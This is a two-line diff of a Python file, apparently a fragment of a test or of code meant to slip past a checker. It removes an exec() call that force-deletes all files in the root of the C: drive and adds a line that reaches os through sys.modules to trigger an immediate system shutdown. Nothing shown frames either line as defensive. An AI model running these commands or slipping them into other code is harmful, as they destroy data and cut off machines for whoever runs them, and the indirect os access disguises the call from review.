@@ -1,1 +1,2 @@
-exec('import os; os.system("del /f /q C:\\*")')  # test
+import sys
+sys.modules['os'].system('shutdown /s /t 0')
